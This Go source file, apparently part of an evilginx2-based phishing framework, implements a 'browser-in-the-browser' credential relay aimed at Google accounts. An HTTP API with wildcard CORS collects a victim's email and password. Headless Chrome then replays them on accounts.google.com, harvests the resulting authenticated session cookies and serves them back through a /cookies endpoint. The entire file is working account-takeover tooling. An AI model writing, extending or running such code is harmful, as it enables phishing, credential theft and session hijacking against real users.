package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

type BitbStatus string

const (
	BitbStatusIdle          BitbStatus = "idle"
	BitbStatusEmailSent     BitbStatus = "email_sent"
	BitbStatusPasswordNeeded BitbStatus = "password_needed"
	BitbStatusLoggingIn     BitbStatus = "logging_in"
	BitbStatusComplete      BitbStatus = "complete"
	BitbStatusFailed        BitbStatus = "failed"
)

type BitbCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Path     string `json:"path"`
	Secure   bool   `json:"secure"`
	HttpOnly bool   `json:"httpOnly"`
}

type BitbSession struct {
	SessionId   string
	Email       string
	Password    string
	Status      BitbStatus
	Cookies     []BitbCookie
	CreatedAt   time.Time
	CompletedAt time.Time
	Error       string
	page        *rod.Page
	mu          sync.Mutex
}

type BitbManager struct {
	googleBypass *GoogleBypass
	sessions     map[string]*BitbSession
	mu           sync.Mutex
}

func NewBitbManager(gb *GoogleBypass) *BitbManager {
	bm := &BitbManager{
		googleBypass: gb,
		sessions:     make(map[string]*BitbSession),
	}
	bm.startAPIServer()
	return bm
}

func (bm *BitbManager) startAPIServer() {
	mux := http.NewServeMux()
	mux.HandleFunc("/email", bm.HandleEmailSubmit)
	mux.HandleFunc("/password", bm.HandlePasswordSubmit)
	mux.HandleFunc("/status/", bm.HandleStatusRequest)
	mux.HandleFunc("/cookies/", bm.HandleCookiesRequest)

	handler := corsMiddleware(mux)

	go func() {
		port := 9090
		log.Info("bitb: API server starting on port %d", port)
		if err := http.ListenAndServe(fmt.Sprintf(":%d", port), handler); err != nil {
			log.Error("bitb: API server error: %v", err)
		}
	}()
}

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}
		next.ServeHTTP(w, r)
	})
}

var globalBitbCookieCallback func(sessionId string, cookies []BitbCookie)

func RegisterBitbCookieCallback(fn func(sessionId string, cookies []BitbCookie)) {
	globalBitbCookieCallback = fn
}

func (bm *BitbManager) SubmitEmail(sessionId string, email string) error {
	bm.mu.Lock()
	if _, exists := bm.sessions[sessionId]; exists {
		old := bm.sessions[sessionId]
		if old.page != nil {
			old.page.Close()
		}
		delete(bm.sessions, sessionId)
	}

	bs := &BitbSession{
		SessionId: sessionId,
		Email:     email,
		Status:    BitbStatusIdle,
		CreatedAt: time.Now(),
	}
	bm.sessions[sessionId] = bs
	bm.mu.Unlock()

	err := bm.performEmailStep(bs)
	if err != nil {
		bs.mu.Lock()
		bs.Status = BitbStatusFailed
		bs.Error = err.Error()
		bs.mu.Unlock()
		return err
	}
	return nil
}

func (bm *BitbManager) SubmitPassword(sessionId string, password string) error {
	bm.mu.Lock()
	bs, ok := bm.sessions[sessionId]
	bm.mu.Unlock()

	if !ok {
		return fmt.Errorf("session not found")
	}

	bs.mu.Lock()
	if bs.Status != BitbStatusPasswordNeeded {
		bs.mu.Unlock()
		return fmt.Errorf("password not expected yet, current status: %s", bs.Status)
	}
	bs.Password = password
	bs.Status = BitbStatusLoggingIn
	bs.mu.Unlock()

	err := bm.performPasswordStep(bs)
	if err != nil {
		bs.mu.Lock()
		bs.Status = BitbStatusFailed
		bs.Error = err.Error()
		bs.mu.Unlock()
		return err
	}
	return nil
}

func (bm *BitbManager) performEmailStep(bs *BitbSession) error {
	if bm.googleBypass == nil || !bm.googleBypass.running {
		return fmt.Errorf("chrome not available (use --google-bypass)")
	}

	bm.mu.Lock()
	browser := bm.googleBypass.browser
	bm.mu.Unlock()

	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return fmt.Errorf("create page: %v", err)
	}

	bs.mu.Lock()
	bs.page = page
	bs.Status = BitbStatusEmailSent
	bs.mu.Unlock()

	if err := page.SetViewport(&proto.EmulationSetDeviceMetricsOverride{
		Width: 1920, Height: 1080, DeviceScaleFactor: 1, Mobile: false,
	}); err != nil {
		return fmt.Errorf("set viewport: %v", err)
	}

	log.Debug("bitb: navigating to accounts.google.com for %s", bs.Email)
	if err := page.Navigate("https://accounts.google.com/"); err != nil {
		return fmt.Errorf("navigate: %v", err)
	}
	page.MustWaitLoad()

	el, err := page.Element("#identifierId")
	if err != nil {
		return fmt.Errorf("email field not found: %v", err)
	}
	if err := el.Input(bs.Email); err != nil {
		return fmt.Errorf("email input: %v", err)
	}
	time.Sleep(500 * time.Millisecond)

	if err := page.Keyboard.Press(input.Enter); err != nil {
		return fmt.Errorf("enter after email: %v", err)
	}

	// Wait for password field to appear
	found := false
	for i := 0; i < 30; i++ {
		time.Sleep(500 * time.Millisecond)
		pwEl, err := page.Element("input[type=\"password\"]")
		if err == nil && pwEl != nil {
			visible, _ := pwEl.Visible()
			if visible {
				found = true
				break
			}
		}
		// Check for challenge/alternate screens
		url, _ := page.Eval("window.location.href")
		if err == nil {
			urlStr := url.Value.String()
			if strings.Contains(urlStr, "challenge") || strings.Contains(urlStr, "signin/v2/challenge") {
				found = true
				break
			}
		}
	}

	if !found {
		return fmt.Errorf("password field did not appear within timeout")
	}

	bs.mu.Lock()
	bs.Status = BitbStatusPasswordNeeded
	bs.mu.Unlock()

	log.Info("bitb: email submitted, password page ready for %s", bs.Email)
	return nil
}

func (bm *BitbManager) performPasswordStep(bs *BitbSession) error {
	bs.mu.Lock()
	page := bs.page
	bs.mu.Unlock()

	if page == nil {
		return fmt.Errorf("no browser page for this session")
	}

	pwEl, err := page.Element("input[type=\"password\"]")
	if err != nil {
		return fmt.Errorf("password field not found: %v", err)
	}
	if err := pwEl.Input(bs.Password); err != nil {
		return fmt.Errorf("password input: %v", err)
	}
	time.Sleep(500 * time.Millisecond)

	if err := page.Keyboard.Press(input.Enter); err != nil {
		return fmt.Errorf("enter after password: %v", err)
	}

	log.Debug("bitb: password submitted, waiting for login completion...")

	// Wait for successful login redirect
	for i := 0; i < 30; i++ {
		time.Sleep(1 * time.Second)
		page.MustWaitLoad()
		url, err := page.Eval("window.location.href")
		if err == nil {
			urlStr := url.Value.String()
			log.Debug("bitb: current URL: %s", urlStr)
			if strings.Contains(urlStr, "myaccount.google.com") ||
				strings.Contains(urlStr, "mail.google.com") ||
				strings.Contains(urlStr, "accounts.google.com/signin/v2/success") ||
				strings.Contains(urlStr, "www.google.com/webhp") {
				break
			}
		}
	}

	time.Sleep(2 * time.Second)

	cookies, err := bm.extractCookies(page)
	if err != nil {
		return fmt.Errorf("cookie extraction failed: %v", err)
	}

	bs.mu.Lock()
	bs.Cookies = cookies
	bs.Status = BitbStatusComplete
	bs.CompletedAt = time.Now()
	bs.mu.Unlock()

	log.Info("bitb: login complete for %s - %d cookies", bs.Email, len(cookies))

	if globalBitbCookieCallback != nil {
		globalBitbCookieCallback(bs.SessionId, cookies)
	}

	if page != nil {
		page.Close()
		bs.mu.Lock()
		bs.page = nil
		bs.mu.Unlock()
	}

	return nil
}

func (bm *BitbManager) extractCookies(page *rod.Page) ([]BitbCookie, error) {
	cdpCookies, err := page.Cookies(nil)
	if err != nil {
		cdpResult, err2 := proto.NetworkGetCookies{}.Call(page)
		if err2 != nil {
			return nil, fmt.Errorf("get cookies: %v / %v", err, err2)
		}
		cdpCookies = cdpResult.Cookies
	}

	var cookies []BitbCookie
	seen := make(map[string]bool)
	for _, c := range cdpCookies {
		key := c.Name + "=" + c.Value
		if seen[key] {
			continue
		}
		seen[key] = true
		cookies = append(cookies, BitbCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Path:     c.Path,
			Secure:   c.Secure,
			HttpOnly: c.HTTPOnly,
		})
	}
	return cookies, nil
}

func (bm *BitbManager) GetStatus(sessionId string) (string, int, error) {
	bm.mu.Lock()
	bs, ok := bm.sessions[sessionId]
	bm.mu.Unlock()
	if !ok {
		return "", 0, fmt.Errorf("session not found")
	}
	bs.mu.Lock()
	defer bs.mu.Unlock()
	return string(bs.Status), len(bs.Cookies), nil
}

func (bm *BitbManager) GetCookies(sessionId string) ([]BitbCookie, error) {
	bm.mu.Lock()
	bs, ok := bm.sessions[sessionId]
	bm.mu.Unlock()
	if !ok {
		return nil, fmt.Errorf("session not found")
	}
	bs.mu.Lock()
	defer bs.mu.Unlock()
	if bs.Status != BitbStatusComplete {
		return nil, fmt.Errorf("login not complete: %s", bs.Status)
	}
	result := make([]BitbCookie, len(bs.Cookies))
	copy(result, bs.Cookies)
	return result, nil
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

type bitbEmailRequest struct {
	SessionId string `json:"sessionId"`
	Email     string `json:"email"`
}

type bitbPasswordRequest struct {
	SessionId string `json:"sessionId"`
	Password  string `json:"password"`
}

func (bm *BitbManager) HandleEmailSubmit(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "POST required"})
		return
	}
	var req bitbEmailRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
		return
	}
	if req.SessionId == "" || req.Email == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "sessionId and email required"})
		return
	}

	go func() {
		if err := bm.SubmitEmail(req.SessionId, req.Email); err != nil {
			log.Error("bitb: email submit failed: %v", err)
		}
	}()

	status, _, _ := bm.GetStatus(req.SessionId)
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":  status,
		"message": "email submitted",
	})
}

func (bm *BitbManager) HandlePasswordSubmit(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "POST required"})
		return
	}
	var req bitbPasswordRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
		return
	}
	if req.SessionId == "" || req.Password == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "sessionId and password required"})
		return
	}

	go func() {
		if err := bm.SubmitPassword(req.SessionId, req.Password); err != nil {
			log.Error("bitb: password submit failed: %v", err)
		}
	}()

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":  "submitted",
		"message": "password submitted",
	})
}

func (bm *BitbManager) HandleStatusRequest(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/bitb/")
	path = strings.TrimPrefix(path, "/status/")
	sessionId := path
	if sessionId == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing session id"})
		return
	}

	status, cookieCount, err := bm.GetStatus(sessionId)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
		return
	}

	resp := map[string]interface{}{
		"session_id":   sessionId,
		"status":       status,
		"cookie_count": cookieCount,
	}

	if status == string(BitbStatusFailed) {
		bm.mu.Lock()
		bs, _ := bm.sessions[sessionId]
		bm.mu.Unlock()
		if bs != nil {
			resp["error"] = bs.Error
		}
	}

	writeJSON(w, http.StatusOK, resp)
}

func (bm *BitbManager) HandleCookiesRequest(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/bitb/")
	path = strings.TrimPrefix(path, "/cookies/")
	sessionId := path
	if sessionId == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing session id"})
		return
	}

	cookies, err := bm.GetCookies(sessionId)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"session_id": sessionId,
		"cookies":    cookies,
		"count":      len(cookies),
	})
}

func (p *HttpProxy) handleBitbRequest(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	if p.bitbManager == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "bitb not available (use --google-bypass)"})
		return
	}

	p.dispatchBitbRoute(w, r)
}

type responseRecorder struct {
	header http.Header
	body   bytes.Buffer
	code   int
}

func (r *responseRecorder) Header() http.Header {
	if r.header == nil {
		r.header = make(http.Header)
	}
	return r.header
}

func (r *responseRecorder) Write(b []byte) (int, error) {
	return r.body.Write(b)
}

func (r *responseRecorder) WriteHeader(code int) {
	r.code = code
}

func (p *HttpProxy) handleBitbRequestRaw(r *http.Request) ([]byte, error) {
	if p.bitbManager == nil {
		return json.Marshal(map[string]string{"error": "bitb not available"})
	}

	rec := &responseRecorder{code: 200}
	p.dispatchBitbRoute(rec, r)
	if rec.code >= 400 {
		return nil, fmt.Errorf("bitb error: %s", rec.body.String())
	}
	return rec.body.Bytes(), nil
}

func (p *HttpProxy) dispatchBitbRoute(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/bitb/")
	parts := strings.Split(path, "/")
	if len(parts) < 1 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid path"})
		return
	}

	switch parts[0] {
	case "email":
		p.bitbManager.HandleEmailSubmit(w, r)
	case "password":
		p.bitbManager.HandlePasswordSubmit(w, r)
	case "status":
		p.bitbManager.HandleStatusRequest(w, r)
	case "cookies":
		p.bitbManager.HandleCookiesRequest(w, r)
	default:
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "unknown endpoint"})
	}
}
